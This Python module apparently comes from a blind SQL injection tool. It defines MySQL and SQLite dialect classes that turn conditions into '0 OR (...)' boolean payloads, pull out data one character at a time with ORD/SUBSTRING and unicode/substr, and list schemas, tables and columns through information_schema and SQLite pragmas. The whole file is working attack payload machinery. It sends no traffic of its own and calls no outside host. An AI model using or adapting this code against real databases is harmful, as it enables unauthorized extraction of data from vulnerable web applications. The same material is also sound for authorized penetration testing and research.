from __future__ import annotations

import re
from abc import ABC, abstractmethod


_IDENTIFIER = re.compile(r"^[A-Za-z_][A-Za-z0-9_$.-]*$")


class DialectError(ValueError):
    pass


def sql_literal(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def validate_identifier(value: str) -> str:
    if not _IDENTIFIER.fullmatch(value):
        raise DialectError(f"Unsafe or unsupported identifier: {value!r}")
    return value


class SqlDialect(ABC):
    name: str

    def boolean_payload(self, condition: str) -> str:
        return f"0 OR ({condition})"

    @abstractmethod
    def text_expression(self, expression: str) -> str:
        raise NotImplementedError

    @abstractmethod
    def length_expression(self, expression: str) -> str:
        raise NotImplementedError

    @abstractmethod
    def char_code_expression(self, expression: str, position: int) -> str:
        raise NotImplementedError

    @abstractmethod
    def schema_count_expression(self) -> str:
        raise NotImplementedError

    @abstractmethod
    def schema_name_expression(self, index: int) -> str:
        raise NotImplementedError

    @abstractmethod
    def table_count_expression(self, schema: str) -> str:
        raise NotImplementedError

    @abstractmethod
    def table_name_expression(self, schema: str, index: int) -> str:
        raise NotImplementedError

    @abstractmethod
    def column_count_expression(self, schema: str, table: str) -> str:
        raise NotImplementedError

    @abstractmethod
    def column_name_expression(self, schema: str, table: str, index: int) -> str:
        raise NotImplementedError


class MySqlDialect(SqlDialect):
    name = "mysql"

    def text_expression(self, expression: str) -> str:
        return f"COALESCE(CAST(({expression}) AS CHAR), '')"

    def length_expression(self, expression: str) -> str:
        return f"CHAR_LENGTH({self.text_expression(expression)})"

    def char_code_expression(self, expression: str, position: int) -> str:
        return f"ORD(SUBSTRING({self.text_expression(expression)}, {position}, 1))"

    def schema_count_expression(self) -> str:
        return "SELECT COUNT(*) FROM information_schema.schemata"

    def schema_name_expression(self, index: int) -> str:
        return (
            "SELECT schema_name FROM information_schema.schemata "
            f"ORDER BY schema_name LIMIT 1 OFFSET {index}"
        )

    def table_count_expression(self, schema: str) -> str:
        return (
            "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = "
            f"{sql_literal(schema)}"
        )

    def table_name_expression(self, schema: str, index: int) -> str:
        return (
            "SELECT table_name FROM information_schema.tables WHERE table_schema = "
            f"{sql_literal(schema)} ORDER BY table_name LIMIT 1 OFFSET {index}"
        )

    def column_count_expression(self, schema: str, table: str) -> str:
        return (
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = "
            f"{sql_literal(schema)} AND table_name = {sql_literal(table)}"
        )

    def column_name_expression(self, schema: str, table: str, index: int) -> str:
        return (
            "SELECT column_name FROM information_schema.columns WHERE table_schema = "
            f"{sql_literal(schema)} AND table_name = {sql_literal(table)} "
            f"ORDER BY ordinal_position LIMIT 1 OFFSET {index}"
        )


class SqliteDialect(SqlDialect):
    name = "sqlite"

    def text_expression(self, expression: str) -> str:
        return f"COALESCE(CAST(({expression}) AS TEXT), '')"

    def length_expression(self, expression: str) -> str:
        return f"length({self.text_expression(expression)})"

    def char_code_expression(self, expression: str, position: int) -> str:
        return f"unicode(substr({self.text_expression(expression)}, {position}, 1))"

    def schema_count_expression(self) -> str:
        return "SELECT COUNT(*) FROM pragma_database_list"

    def schema_name_expression(self, index: int) -> str:
        return (
            "SELECT name FROM pragma_database_list "
            f"ORDER BY seq LIMIT 1 OFFSET {index}"
        )

    def _schema_prefix(self, schema: str) -> str:
        validate_identifier(schema)
        return '"' + schema.replace('"', '""') + '"'

    def table_count_expression(self, schema: str) -> str:
        prefix = self._schema_prefix(schema)
        return (
            f"SELECT COUNT(*) FROM {prefix}.sqlite_schema "
            "WHERE type = 'table' AND name NOT LIKE 'sqlite_%'"
        )

    def table_name_expression(self, schema: str, index: int) -> str:
        prefix = self._schema_prefix(schema)
        return (
            f"SELECT name FROM {prefix}.sqlite_schema "
            "WHERE type = 'table' AND name NOT LIKE 'sqlite_%' "
            f"ORDER BY name LIMIT 1 OFFSET {index}"
        )

    def column_count_expression(self, schema: str, table: str) -> str:
        if schema not in {"main", "temp"}:
            raise DialectError(
                "SQLite column enumeration currently supports main/temp schemas only."
            )
        return f"SELECT COUNT(*) FROM pragma_table_info({sql_literal(table)})"

    def column_name_expression(self, schema: str, table: str, index: int) -> str:
        if schema not in {"main", "temp"}:
            raise DialectError(
                "SQLite column enumeration currently supports main/temp schemas only."
            )
        return (
            f"SELECT name FROM pragma_table_info({sql_literal(table)}) "
            f"ORDER BY cid LIMIT 1 OFFSET {index}"
        )


def get_dialect(name: str) -> SqlDialect:
    normalized = name.casefold()
    if normalized == "mysql":
        return MySqlDialect()
    if normalized == "sqlite":
        return SqliteDialect()
    raise DialectError(f"Unsupported SQL dialect: {name}")
